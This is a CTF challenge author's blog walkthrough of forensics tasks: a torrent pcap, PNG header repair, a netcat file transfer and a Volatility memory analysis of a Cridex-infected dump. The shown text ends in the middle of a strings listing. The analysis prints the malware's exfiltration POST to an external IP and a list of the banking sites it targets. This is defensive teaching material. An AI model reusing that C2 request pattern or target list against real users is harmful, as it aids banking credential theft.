---

title: "ShehacksKE Intervarsity CTF - KCA"
date: 2022-07-20 01:09:33 +0300
author: oste
image: /assets/img/Posts/shehacksctf.png
categories: [CTF-TIME]
tags: [ctf, maldoc, wireshark, volatility]
---

Hey there and welcome to yet another blog post. Last weekend i had the privilege to create forensics challenges for KCA University CTF, courtesy of the fr334aks, SheHacksKe, Safaricom , AfricaHackOn, Ekraal Innovation Hub & Microsoft. The CTF was meant to be very beginner friendly and i'm glad most people actually solved my challs.😁😁 Anyway, today i will be walking you through my thought process on how to solve the challenges and maybe how i created some of them. Lets get started.

# Torrent

> Tom has been warned severaly about torrenting files and movies while on the office network. We managed to capture traffic this time round and we hope you can help us identify what he was downloading this time

Flag format: Flag{xxxx-xx.xx.xx-xxxx-xxxx-xxxxx.iso}

Points allocated: 100

---

You are presented for a pcap file containing `bittorent` related traffic and required to figure out which file was downloaded.

This is also a common challenge you will come across in most CTF's from time to time. But how do you get started? Lemmy first take you through how i made this challenge.

Sometime back out of curiousity, i wanted to learn how to analyze torrent traffic, so i visited [torrent.ubuntu.com](https://torrent.ubuntu.com/tracker_index) and downloaded the torrent file.

![image](https://user-images.githubusercontent.com/58165365/179797114-fad8bdd2-5e86-4620-b35b-298d023f9b2e.png)

![image](https://user-images.githubusercontent.com/58165365/179797435-fdc565f8-c844-4244-b765-729523da9ba4.png)

Spin up wireshark and started intercepting the traffic. I then loaded the torrent file to my torrent client ([Tixati](https://www.tixati.com/download/)) and observed the event log. I noticed the same `info hash` as displayed on Ubuntu's torrent tracker site.

> The info hash contains all the relevant torrent info and content: its name, and other data necessary to download it. If you'd like a deep dive on what info hash is, you can dig into this [StackOverflow](https://stackoverflow.com/questions/28348678/what-exactly-is-the-info-hash-in-a-torrent-file) question.

![image](https://user-images.githubusercontent.com/58165365/179798223-590fcdf2-f069-423c-b130-942d5b103111.png)

Now lets go back to wireshark.

First, a peer identifies other peers that are able to connect to a session by attempting to send a TCP SYN packet. If a TCP session is connected, the peer checks other peers to determine if they are sharing requested data. Data checking is done during a `BitTorrent handshake`. How do you get the Handshake? You can use the search feature in wireshark to find a packet that contains the `SHA1 Hash of info dictionary:` string

![image](https://user-images.githubusercontent.com/58165365/179802169-62610f09-e9a8-4f69-8725-389a2591fdcf.png)

Once you retrieve the info hash, you can proceed to google the hash which should give you hints to the file downloaded

![image](https://user-images.githubusercontent.com/58165365/180012879-22dc8a1f-545a-4051-9cc6-8693a4662b0a.png)

**Answer:** `Flag{ubuntu-20.04.4-live-server-amd64.iso}`

# Quick Recovery

> _Hey, a friend sent me this image file containing a secret but when i try viewing it, i get the error "It appears that we don't support this file format". Can you help me fix the image?_

Flag format: Flag{xxxx_xxxx_xxxx_xxxx}

Points Allocated: 50

---

In this challenge, you are presented a broken image file and expected to fix it in order to retrieve the flag. This is a common challenge in most CTF's that kinda tests your ability to analyze file signatures.

In this case, you can first confirm if the presented file is indeed a PNG file by running:

```bash
➜  file broken.png
broken.png: data
```

The second thing i typically do is checking the hex signature of the image by running:

```bash
➜  xxd broken.png | head
00000000: 0d0a 1a0a 0000 000d 4948 4452 0000 0402  ........IHDR....
00000010: 0000 0402 0806 0000 0036 205a b500 0020  .........6 Z...
00000020: 0049 4441 5478 5eec ddc1 962b 3912 6cd7  .IDATx^....+9.l.
00000030: aaff ffe8 5649 4b13 4d94 cb1e 3390 8788  ....VIK.M...3...
00000040: 5d63 2301 3f66 f040 78f2 76ff fbbf fffe  ]c#.?f.@x.v.....
00000050: fbc7 7f08 2080 0002 0820 8000 0208 2080  .... .... .... .
00000060: 0002 0820 f00a 02ff 1a04 bcc2 6745 2280  ... ........gE".
00000070: 0002 0820 8000 0208 2080 0002 0820 f0ff  ... .... .... ..
00000080: 1030 0810 0404 1040 0001 0410 4000 0104  .0.....@....@...
00000090: 1040 0001 045e 44c0 20e0 4566 2b15 0104  .@...^D. .Ef+...
```

In our case, we can see the hex signature `89 50 4E 47` or `‰PNG` is missing. How do you know that? I use [this](https://en.wikipedia.org/wiki/List_of_file_signatures) wiki to cross reference file signatures. I would then search for png and you get:

![image](https://user-images.githubusercontent.com/58165365/179370590-529ee002-fd0f-497b-a5c9-0118fa64dc5e.png)

Now lets go ahead and launch the image in a hex editor. This is what you'll get:

![image](https://user-images.githubusercontent.com/58165365/179370553-8e1df4ba-c14e-4d2a-8197-4952f4d9167d.png)

If we add the missing hex signature, it would look something like:

![image](https://user-images.githubusercontent.com/58165365/179370613-9eaf63f0-bc22-4bee-b137-a52eba4f8223.png)

Saving the image and viewing it, gives you a QR code.

![image](https://user-images.githubusercontent.com/58165365/179370628-7445f658-c3ba-4373-b60f-009aef5a29cb.png)

Scanning this should be relatively easy. You can use your phone or [this](https://qrcodescan.in/) site

![image](https://user-images.githubusercontent.com/58165365/179370636-ab21a345-d208-44d1-ade9-8b108da1f0a4.png)

![image](https://user-images.githubusercontent.com/58165365/179370644-d997c14b-30fe-4470-8f12-9abfc327c917.png)

Alternatively, you can automate the whole image fixing process by using a nifty little tool called [PCRT](https://github.com/sherlly/PCRT). (_A tool to help check if PNG image correct and try to auto fix the error. It's cross-platform, which can run on Windows, Linux and Mac OS._)

![image](https://user-images.githubusercontent.com/58165365/180049661-e60e7c3e-2a05-4284-a1a3-f36f04581acd.png)

Answer: `Flag{Th@nk5_F1x1ng_M3_BuDdy}`

# Chatty Chatty - 1

> _The University NOC has presented you with this PCAP file to help them understand some conversation between two hosts on the network. Can you use your expertise to figure out the contents of the file transmitted?_

Flag format: Flag{xxxx_xxx_xxxx}

Points allocated: 100

---

## Challenge Creation.

I used two machines to create this challenge, Kali & Ubuntu Server. Both machines should have netcat installed.

`sudo apt install netcat`

Before tinkering around with nc, i spin up wireshark and begun to intercept traffic.

On my ubuntu server, i run:

`nc -l -p 80`

On my Kali Linux, i run:

`nc <ip_of_ubuntu> 80`

![image](https://user-images.githubusercontent.com/58165365/180068736-dba66493-c481-401b-9d23-a5186bf39c45.png)

Upon getting a connection, i started to simulate a chat conversation. How you'd get the conversation on wireshark was simple. Looking at the first packet, we see one host communicating to another on port 80. You'd probably think, "ah ...why not filter for http traffic" as this port is used by HTTP. Well if you go ahead and do that, you wont get anything😅. Right-clicking on the first packet and following the TCP stream would reveal the convo.

![image](https://user-images.githubusercontent.com/58165365/179371061-14416365-3d34-4a03-a3b2-c77ed035e2f2.png)

![image](https://user-images.githubusercontent.com/58165365/179371070-c1b9df3a-256a-46ab-958d-611df4921305.png)

After reading the convo, you will notice there should be a file that is to be transfered on a `leet` port. Someone DM'd me to ask which port is called leet and i was like

![GIF](https://i.gifer.com/UrLr.gif)

> _Leet speak, also known as hackspeak or simply leet, is the substitution of a word's letters with numbers or special characters. "Leet" is derived from the word "elite," which refers to the hackers who originally turned leet speak into a sort of cult language in the 1980s._

Anyway, leet port is `1337`. Having this in mind, you'd typically look for packets whereby both hosts are communicating on port 1337. In this case:

![image](https://user-images.githubusercontent.com/58165365/179371227-e95db520-79ea-4c93-b956-0828240c09d1.png)

If you right-click on the first packet and follow TCP stream, you will get:

![image](https://user-images.githubusercontent.com/58165365/179371097-22866d9d-735b-4eab-9b9e-ec5e0a33399d.png)

> _Quick one before i forget, this is how i sent the file from ubuntu to kali using nc_

![image](https://user-images.githubusercontent.com/58165365/180069146-f1597b85-87c8-4183-b87e-a7ac77c2440e.png)

Lets proceed. On careful inspection, you'll notice this is a PNG being transfered. But how can one view it?

![image](https://user-images.githubusercontent.com/58165365/179371115-80c12320-5df8-4854-8d2d-f0cc1f1dbbd1.png)

Simply change how the data is displayed(ASCII) to RAW data and copy all the values.

![image](https://user-images.githubusercontent.com/58165365/179371156-5544e6cb-e7e9-4ab2-8fbc-64ef501620f0.png)

Spin up your favourite hex editor and create a new file. Paste the raw data and save the file as `WhatEverYouWant.png`.

![image](https://user-images.githubusercontent.com/58165365/179371163-ba9eda6e-68c4-4344-ae06-8145654aeeaf.png)

If you now load the image, we get a flag.🚩🚩🚩

![image](https://user-images.githubusercontent.com/58165365/179371174-deb1c5e9-18f4-45f7-9503-4ef7ab639827.png)

**Answer:** `Flag{YoU_@re_Sm@rt}`

# Chatty Chatty - 2

> _Bonus: You found the first flag, great! "See ye and you shall find me" . Dig deeper to earn the second flag._

Flag format: Flag{xxx_xxx_xxx_xxx_xxx_xxx}

Points Allocated : `50`

---

For chatty chatty 2 challenge, you are hinted to dig deeper to reveal the second flag. This was very easy. All one needed to do was run `exiftool` on the image and on careful observation , you'll notice the comment property has some base64 encoded string. Decoding it would give you the flag.

![image](https://user-images.githubusercontent.com/58165365/179371365-432851a3-9ff9-400a-8fc8-833968c4eb9e.png)

```bash
$ echo "Q29uZ3JhdHMsaGVyZSBpcyB5b3VyIGZsYWc6IEZsYWd7SV9LbjN3X1kwdV93MHVsRF9mMW5kX21lfQ==" | base64 -d
Congrats,here is your flag: Flag{I_Kn3w_Y0u_w0ulD_f1nd_me}
```

**Answer:** `Flag{I_kn3w_Y0u_w0u1D_f1nd_me}`

If you are interested to know how i added the comment property to the image, i simply run:

```bash
exiftool -comment='Q29uZ3JhdHMsaGVyZSBpcyB5b3VyIGZsYWc6IEZsYWd7SV9LbjN3X1kwdV93MHVsRF9mMW5kX21lfQ==' WhatEverYouWant.png
```

# Memory Forensics Challenge

<details>
<summary>Memory Forensics Questions</summary>
<pre>

```bash
## Memory 1

> _The SOC team noticed unusual traffic coming from one of the office workstations. They dumped the memory for you and belive you can help them figure out what was happening. Can you figure out which process seems unusual alongside its Parent Process ID (PPID)_

Flag format: Flag{Process,PPID}

Points to allocate: 100

## Memory 2

> _The SOC team mentioned they observed wierd traffic originating from an unusual port. Can you figure out the local address, remote address and the suspicious Port on which the victim machine was still listening on?_

Flag Format: Flag{localaddress,remoteaddress,port}

Points to allocate: 100

## Memory 3

> _What is the full path where the suspicious process was running from?_

Flag Format: Flag{C:\xxxxxxxxx\xxxxxxx\xxxxxx\xxxxx\xxxxxxx.exe}

Points to allocate: 100

## Memory 4

> _From analysing the memory dump, can you determine the User of the system being investigated?_

Flag Format: Flag{Username}

Points to allocate: 200

## Memory 5

> _The SOC picked up and Odd POST request which they believe was used to exfiltrate data, can you retrieve it?_

Flag Format: Flag{/xx/x_xx_x/xx/}

Points to allocate: 500
```

</pre>
</details>

So, what is a memory dump? Simply put, a memory dump (also known as a core dump or system dump) is a snapshot capture of computer memory data from a specific instant. A memory dump can contain valuable forensics data about the state of the system before an incident such as a crash or security compromise.

> _Memory forensics can provide unique insights into runtime system activity, including open network connections and recently executed commands or processes. In many cases, critical data pertaining to attacks or threats will exist solely in system memory – examples include network connections, account credentials, chat messages, encryption keys, running processes, injected code fragments, and internet history which is non-cacheable. Any program – malicious or otherwise – must be loaded in memory in order to execute, making memory forensics critical for identifying otherwise obfuscated attacks._ -Source: [DigitalGuardian](https://digitalguardian.com/blog/what-are-memory-forensics-definition-memory-forensics)

With that said, I'm going to be doing a deep dive into the dump as i share my thought process

The first thing i do when i get a piece of evidence for analysis is get the `MD5` & `SHA256` hash values and compare them to the values presented by the investigator who acquired it. This is to ensure the evidence has not been tampered with.

```
sansforensics@siftworkstation -> ~/D/cases
$ md5sum cridex.vmem
7494f3b77db1525c1974f5380744ae46  cridex.vmem
sansforensics@siftworkstation -> ~/D/cases
$ sha256sum cridex.vmem
02a63be2fcf3a63446c3c8ca9151aff963f888204d141e46c6be60ddde7c3e8d  cridex.vmem
```

We can now start investigating our dump. In this case, i am going to use Volatility framework to forensically extract digital artifacts.

You can download a copy of the tool [here](https://github.com/volatilityfoundation/volatility)

Other tools you can explore on memory forensics include:

- [Rekall Framework](https://www.rekall-forensic.com/)
- [Redline](https://fireeye.market/apps/211364)

Lets first begin by finding some information on the memory dump. We can do so by using the `imageinfo` plugin.

```
# vol.py -f cridex.vmem imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (C:\Users\OSTE\Downloads\cridex.vmem)
                      PAE type : PAE
                           DTB : 0x2fe000L
                          KDBG : 0x80545ae0L
          Number of Processors : 1
     Image Type (Service Pack) : 3
                KPCR for CPU 0 : 0xffdff000L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2012-07-22 02:45:08 UTC+0000
     Image local date and time : 2012-07-21 22:45:08 -0400
```

> `-f` flag is for indicating the directory where the dump is located

Awesome, so we can see that the Suggested operating system is Windows XP with service pack 2. Just to be sure that the correct image profile is `WinXPSP2x86` , we can run `kdbgscan` to determine the correct profile.

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem kdbgscan
Volatility Foundation Volatility Framework 2.6
**************************************************
Instantiating KDBG using: Kernel AS WinXPSP2x86 (5.1.0 32bit)
Offset (V)                    : 0x80545ae0
Offset (P)                    : 0x545ae0
KDBG owner tag check          : True
Profile suggestion (KDBGHeader): WinXPSP3x86
Version64                     : 0x80545ab8 (Major: 15, Minor: 2600)
Service Pack (CmNtCSDVersion) : 3
Build string (NtBuildLab)     : 2600.xpsp.080413-2111
PsActiveProcessHead           : 0x8055a158 (17 processes)
PsLoadedModuleList            : 0x80553fc0 (109 modules)
KernelBase                    : 0x804d7000 (Matches MZ: True)
Major (OptionalHeader)        : 5
Minor (OptionalHeader)        : 1
KPCR                          : 0xffdff000 (CPU 0)

**************************************************
Instantiating KDBG using: Kernel AS WinXPSP2x86 (5.1.0 32bit)
Offset (V)                    : 0x80545ae0
Offset (P)                    : 0x545ae0
KDBG owner tag check          : True
Profile suggestion (KDBGHeader): WinXPSP2x86
Version64                     : 0x80545ab8 (Major: 15, Minor: 2600)
Service Pack (CmNtCSDVersion) : 3
Build string (NtBuildLab)     : 2600.xpsp.080413-2111
PsActiveProcessHead           : 0x8055a158 (17 processes)
PsLoadedModuleList            : 0x80553fc0 (109 modules)
KernelBase                    : 0x804d7000 (Matches MZ: True)
Major (OptionalHeader)        : 5
Minor (OptionalHeader)        : 1
KPCR                          : 0xffdff000 (CPU 0)
```

Awesome.So we now know the profile WinXPSP2x86 .From now onwards, we are going to be specifying the OS profile as `--profile=WinXPSP2x86` and begin to find out what really happened on the victim's computer. From the above command, we can see that there were 17 processes running when the RAM was captured. Using the `pslist` plugin, we can print all running processes by following the EPROCESS lists.

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 pslist
Volatility Foundation Volatility Framework 2.6
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0x823c89c8 System                    4      0     53      240 ------      0
0x822f1020 smss.exe                368      4      3       19 ------      0 2012-07-22 02:42:31 UTC+0000
0x822a0598 csrss.exe               584    368      9      326      0      0 2012-07-22 02:42:32 UTC+0000
0x82298700 winlogon.exe            608    368     23      519      0      0 2012-07-22 02:42:32 UTC+0000
0x81e2ab28 services.exe            652    608     16      243      0      0 2012-07-22 02:42:32 UTC+0000
0x81e2a3b8 lsass.exe               664    608     24      330      0      0 2012-07-22 02:42:32 UTC+0000
0x82311360 svchost.exe             824    652     20      194      0      0 2012-07-22 02:42:33 UTC+0000
0x81e29ab8 svchost.exe             908    652      9      226      0      0 2012-07-22 02:42:33 UTC+0000
0x823001d0 svchost.exe            1004    652     64     1118      0      0 2012-07-22 02:42:33 UTC+0000
0x821dfda0 svchost.exe            1056    652      5       60      0      0 2012-07-22 02:42:33 UTC+0000
0x82295650 svchost.exe            1220    652     15      197      0      0 2012-07-22 02:42:35 UTC+0000
0x821dea70 explorer.exe           1484   1464     17      415      0      0 2012-07-22 02:42:36 UTC+0000
0x81eb17b8 spoolsv.exe            1512    652     14      113      0      0 2012-07-22 02:42:36 UTC+0000
0x81e7bda0 reader_sl.exe          1640   1484      5       39      0      0 2012-07-22 02:42:36 UTC+0000
0x820e8da0 alg.exe                 788    652      7      104      0      0 2012-07-22 02:43:01 UTC+0000
0x821fcda0 wuauclt.exe            1136   1004      8      173      0      0 2012-07-22 02:43:46 UTC+0000
0x8205bda0 wuauclt.exe            1588   1004      5      132      0      0 2012-07-22 02:44:01 UTC+0000
```

We can confirm that indeed there were 17 processes running. A better way of viewing the processes is by using pstree plugin which prints processes and the parent processes.

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0x823c89c8:System                                      4      0     53    240 1970-01-01 00:00:00 UTC+0000
. 0x822f1020:smss.exe                                 368      4      3     19 2012-07-22 02:42:31 UTC+0000
.. 0x82298700:winlogon.exe                            608    368     23    519 2012-07-22 02:42:32 UTC+0000
... 0x81e2ab28:services.exe                           652    608     16    243 2012-07-22 02:42:32 UTC+0000
.... 0x821dfda0:svchost.exe                          1056    652      5     60 2012-07-22 02:42:33 UTC+0000
.... 0x81eb17b8:spoolsv.exe                          1512    652     14    113 2012-07-22 02:42:36 UTC+0000
.... 0x81e29ab8:svchost.exe                           908    652      9    226 2012-07-22 02:42:33 UTC+0000
.... 0x823001d0:svchost.exe                          1004    652     64   1118 2012-07-22 02:42:33 UTC+0000
..... 0x8205bda0:wuauclt.exe                         1588   1004      5    132 2012-07-22 02:44:01 UTC+0000
..... 0x821fcda0:wuauclt.exe                         1136   1004      8    173 2012-07-22 02:43:46 UTC+0000
.... 0x82311360:svchost.exe                           824    652     20    194 2012-07-22 02:42:33 UTC+0000
.... 0x820e8da0:alg.exe                               788    652      7    104 2012-07-22 02:43:01 UTC+0000
.... 0x82295650:svchost.exe                          1220    652     15    197 2012-07-22 02:42:35 UTC+0000
... 0x81e2a3b8:lsass.exe                              664    608     24    330 2012-07-22 02:42:32 UTC+0000
.. 0x822a0598:csrss.exe                               584    368      9    326 2012-07-22 02:42:32 UTC+0000
 0x821dea70:explorer.exe                             1484   1464     17    415 2012-07-22 02:42:36 UTC+0000
. 0x81e7bda0:reader_sl.exe                           1640   1484      5     39 2012-07-22 02:42:36 UTC+0000
```

Analyzing keenly, we see a suspicious process called `reader_sl.exe` running under the parent process, explorer.exe (Look at the PPID). Lets not assume just yet. We can go an extra mile by running `psxview` plugin on the dump which finds hidden processes running in the computer with various process listings.

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 psxview
Volatility Foundation Volatility Framework 2.6
Offset(P)  Name                    PID pslist psscan thrdproc pspcid csrss session deskthrd ExitTime
---------- -------------------- ------ ------ ------ -------- ------ ----- ------- -------- --------
0x02498700 winlogon.exe            608 True   True   True     True   True  True    True
0x02511360 svchost.exe             824 True   True   True     True   True  True    True
0x022e8da0 alg.exe                 788 True   True   True     True   True  True    True
0x020b17b8 spoolsv.exe            1512 True   True   True     True   True  True    True
0x0202ab28 services.exe            652 True   True   True     True   True  True    True
0x02495650 svchost.exe            1220 True   True   True     True   True  True    True
0x0207bda0 reader_sl.exe          1640 True   True   True     True   True  True    True
0x025001d0 svchost.exe            1004 True   True   True     True   True  True    True
0x02029ab8 svchost.exe             908 True   True   True     True   True  True    True
0x023fcda0 wuauclt.exe            1136 True   True   True     True   True  True    True
0x0225bda0 wuauclt.exe            1588 True   True   True     True   True  True    True
0x0202a3b8 lsass.exe               664 True   True   True     True   True  True    True
0x023dea70 explorer.exe           1484 True   True   True     True   True  True    True
0x023dfda0 svchost.exe            1056 True   True   True     True   True  True    True
0x024f1020 smss.exe                368 True   True   True     True   False False   False
0x025c89c8 System                    4 True   True   True     True   False False   False
0x024a0598 csrss.exe               584 True   True   True     True   False True    True
```

In this case, no process seems to be hidden.

> **ProTip:** You can tell a process is hidden by checking the first and second column (pslist & psscan)

We can now proceed with out investigation. Its a good practice to inspect network sockets and open connections. To do this, volatility offers a number of plugins that can inspect network connections such as `netscan` (Scan a Vista (or later) image for connections and sockets) , `connscan` (Pool scanner for tcp connections)and `sockets` (Print list of open sockets). Lets go ahead and try the plugins.

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 connscan
Volatility Foundation Volatility Framework 2.6
Offset(P)  Local Address             Remote Address            Pid
---------- ------------------------- ------------------------- ---
0x02087620 172.16.112.128:1038       41.168.5.140:8080         1484
0x023a8008 172.16.112.128:1037       125.19.103.198:8080       1484
```

We can see that there are two tcp connection which are used by a process with the `Pid 1484`. If we look at the results we got from running pstree, we can see that `explorer.exe` has that Pid.

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 sockets
Volatility Foundation Volatility Framework 2.6
Offset(V)       PID   Port  Proto Protocol        Address         Create Time
---------- -------- ------ ------ --------------- --------------- -----------
0x81ddb780      664    500     17 UDP             0.0.0.0         2012-07-22 02:42:53 UTC+0000
0x82240d08     1484   1038      6 TCP             0.0.0.0         2012-07-22 02:44:45 UTC+0000
0x81dd7618     1220   1900     17 UDP             172.16.112.128  2012-07-22 02:43:01 UTC+0000
0x82125610      788   1028      6 TCP             127.0.0.1       2012-07-22 02:43:01 UTC+0000
0x8219cc08        4    445      6 TCP             0.0.0.0         2012-07-22 02:42:31 UTC+0000
0x81ec23b0      908    135      6 TCP             0.0.0.0         2012-07-22 02:42:33 UTC+0000
0x82276878        4    139      6 TCP             172.16.112.128  2012-07-22 02:42:38 UTC+0000
0x82277460        4    137     17 UDP             172.16.112.128  2012-07-22 02:42:38 UTC+0000
0x81e76620     1004    123     17 UDP             127.0.0.1       2012-07-22 02:43:01 UTC+0000
0x82172808      664      0    255 Reserved        0.0.0.0         2012-07-22 02:42:53 UTC+0000
0x81e3f460        4    138     17 UDP             172.16.112.128  2012-07-22 02:42:38 UTC+0000
0x821f0630     1004    123     17 UDP             172.16.112.128  2012-07-22 02:43:01 UTC+0000
0x822cd2b0     1220   1900     17 UDP             127.0.0.1       2012-07-22 02:43:01 UTC+0000
0x82172c50      664   4500     17 UDP             0.0.0.0         2012-07-22 02:42:53 UTC+0000
0x821f0d00        4    445     17 UDP             0.0.0.0         2012-07-22 02:42:31 UTC+0000
```

We can see that one of this TCP connection is still open, the one using **port 1038** and communicating with the destination IP address **41.168.5.140**.

How about we try extract some command history? Volatility has you sorted. It offers several plugins that can do just that. For example:

- `cmdline` - Displays process command-line arguments
- `cmdscan` - Extracts command history by scanning for \_COMMAND_HISTORY
- `consoles` - Extracts command history by scanning for \_CONSOLE_INFORMATION

In this case, i just run `cmdline` as `cmdscan` and `consoles` did not contain any information in their buffers.

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 cmdline
Volatility Foundation Volatility Framework 2.6
************************************************************************
System pid:      4
************************************************************************
smss.exe pid:    368
Command line : \SystemRoot\System32\smss.exe
************************************************************************
csrss.exe pid:    584
Command line : C:\WINDOWS\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16
************************************************************************
winlogon.exe pid:    608
Command line : winlogon.exe
************************************************************************
services.exe pid:    652
Command line : C:\WINDOWS\system32\services.exe
************************************************************************
lsass.exe pid:    664
Command line : C:\WINDOWS\system32\lsass.exe
************************************************************************
svchost.exe pid:    824
Command line : C:\WINDOWS\system32\svchost -k DcomLaunch
************************************************************************
svchost.exe pid:    908
Command line : C:\WINDOWS\system32\svchost -k rpcss
************************************************************************
svchost.exe pid:   1004
Command line : C:\WINDOWS\System32\svchost.exe -k netsvcs
************************************************************************
svchost.exe pid:   1056
Command line : C:\WINDOWS\system32\svchost.exe -k NetworkService
************************************************************************
svchost.exe pid:   1220
Command line : C:\WINDOWS\system32\svchost.exe -k LocalService
************************************************************************
explorer.exe pid:   1484
Command line : C:\WINDOWS\Explorer.EXE
************************************************************************
spoolsv.exe pid:   1512
Command line : C:\WINDOWS\system32\spoolsv.exe
************************************************************************
reader_sl.exe pid:   1640
Command line : "C:\Program Files\Adobe\Reader 9.0\Reader\Reader_sl.exe"
************************************************************************
alg.exe pid:    788
Command line : C:\WINDOWS\System32\alg.exe
************************************************************************
wuauclt.exe pid:   1136
Command line : "C:\WINDOWS\system32\wuauclt.exe" /RunStoreAsComServer Local\[3ec]SUSDSb81eb56fa3105543beb3109274ef8ec1
************************************************************************
wuauclt.exe pid:   1588
Command line : "C:\WINDOWS\system32\wuauclt.exe"
```

From the output above, we now have better insights of the full path of the processes launched with PID `1484` and `1640`. I went ahead to do some research and found out that the explorer.exe file is located in the `C:\Windows` folder. `Reader_sl.exe` is also suspicious as i would expect `acrobat.exe` to be running.

Did some [research](https://www.file.net/process/acrobat.exe.html) and found acrobat.exe is located in a subfolder of `C:\Program Files (x86)` , mostly `C:\Program Files (x86)\Adobe\Acrobat 11.0\Acrobat\` or `C:\Program Files (x86)\Adobe\Acrobat DC\Acrobat\`

However, we saw there was a network connection running towards an external IP using this Pid. We can Dump the addressable memory for process **1640** using `memdump` & also dump a process to an executable file sample using `procdump` plugin.

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 procdump -p 1640 --dump-dir .
Volatility Foundation Volatility Framework 2.6
Process(V) ImageBase  Name                 Result
---------- ---------- -------------------- ------
0x81e7bda0 0x00400000 reader_sl.exe        OK: executable.1640.exe

root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 memdump -p 1640 --dump-dir .
Volatility Foundation Volatility Framework 2.6
************************************************************************
Writing reader_sl.exe [  1640] to 1640.dmp

root@siftworkstation -> /h/s/D/cases
# ls -la
total 599740
drwxrwxr-x  2 sansforensics root               4096 Aug 10 21:40 .
drwxr-xr-x 24 root          root               4096 May 31  2018 ..
-rw-r--r--  1 root          root           77205504 Aug 10 21:40 1640.dmp
-rw-rw-r--  1 sansforensics sansforensics 536870912 Aug 10 21:15 cridex.vmem
-rw-r--r--  1 root          root              29184 Aug 10 21:40 executable.1640.exe
```

The first file “executable.1640.exe” is a restitution of the executable “Reader_sl.exe” and the dump extracted “1640.dmp” represents the addressable memory of the process.

Lets start by digging into the .dmp file extracted using Strings utility.

> Strings is a utility that finds and prints text strings embedded in binary files such as executables. It can be used on object files and core dumps. _Source: [Wikipedia](https://en.wikipedia.org/wiki/Strings_(Unix))\_

> If you are using a windows lab to perform this analysis, you can download strings from [Windows Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/strings)

Dumps usually contains lots of information. In our scenario, we are looking for a relation between the piece of information already retrieved from the dump for example the opened tcp connection towards the 41.168.5.140 IP and this process with Pid 1640.

```bash
root@siftworkstation -> /h/s/D/cases
# strings 1640.dmp | grep -Fi "41.168.5.140" -C 7
 ABACFPFPENFDECFCEPFHFDEFFPFPACAB
 ABACFPFPENFDECFCEPFHFDEFFPFPACAB
 ABACFPFPENFDECFCEPFHFDEFFPFPACAB
DpI8
POST /zb/v_01_a/in/ HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
Host: 41.168.5.140:8080
Content-Length: 229
Connection: Keep-Alive
Cache-Control: no-cache
>mtvR
`06!
a5p/
(>?c
```

In the above command, i have combined strings command with grep (_another command-line utility for searching plain-text data sets for lines that match a regular expression_) with the **-C flag** to get the previous and next lines, thus giving us more context for the information found.

So what's happening here? We can clearly see that the executable `Reader_sl.exe` is communicating towards the destination IP 41.168.5.140 using `POST` requests, potentially exfiltrating information from the victim’s computer. A basic explanation of `POST` requests explains that it is often used when uploading a file or when submitting a completed web form.

We can proceed to analyze the dump file further by running strings with the `less` option

```bash
root@siftworkstation -> /h/s/D/cases
# strings 1640.dmp | less

//redacted

*treasurypathways.com*
*CorporateAccounts*
*weblink.websterbank.com*
*secure7.onlineaccess1.com*
*trz.tranzact.org*
*onlineaccess1.com*
*secureport.texascapitalbank.com*
*/Authentication/zbf/k/*
*ebc_ebc1961*
*tdbank.com*
*online.ovcb.com*
*ebanking-services.com*
*schwab.com*
*billmelater.com*
*chase.com*
*bankofamerica.com*
*pnc.com*
*suntrust.com*
*wellsfargo.com*
*ibanking-services.com*
*bankonline.umpquabank.com*
*servlet/teller*
*nsbank.com*
*securentry.calbanktrust.com*
*securentry*
*/Common/SignOn/Start.asp*
*telepc.net*
*enterprise2.openbank.com*
*BusinessAppsHome*
*global1.onlinebank.com*
*webexpress*
*/sbuser/*
*webcash*
*firstbanks.com*
*bxs.com*
*businesslogin*
*hbcash.exe*
*otm.suntrust.com*
*/inets/*
*corpACH*
*/IBWS/*
*/ibs.*
*/livewire/*
*/olbb/*
*fnfgbusinessonline.enterprisebanker.com*
*lakecitybank.webcashmgmt.com*
*/inets/*
*bob.sovereignbank.com*
*CLKCCM*
*directline4biz.com*
*e-moneyger.com*
*cashman*
*securentrycorp.amegybank.com*
*netteller*
*onlineserv/CM*
*nubi*
*ibs5.secure-banking*
*ibs.secure-banking*
*blilk*
*svbconnect.com*
*goldleaf*
*/webcm/*
*www.amegybank.com/*
*/wires/*
*bankbyweb*
*internet-ebanking.com*
*treasury.pncbank.com*
*sso.uboc*
*cashplus*
*ebank.rcbcy.com*
*ebemo.bemobank.com*
*e-norvik.lv*
*eurobankefg.com*
*eurobankefg.com.cy*
*ekp.lv*
*fbmedirect.com*
*hblibank.com*
*hellenicnetbanking.com*
*hiponet.lv*
*hkbea*
*ibanka.seb.lv*
*ib.baltikums.com*
*geonline.lv*
*ib.dnb.lv*
*bib.lv*
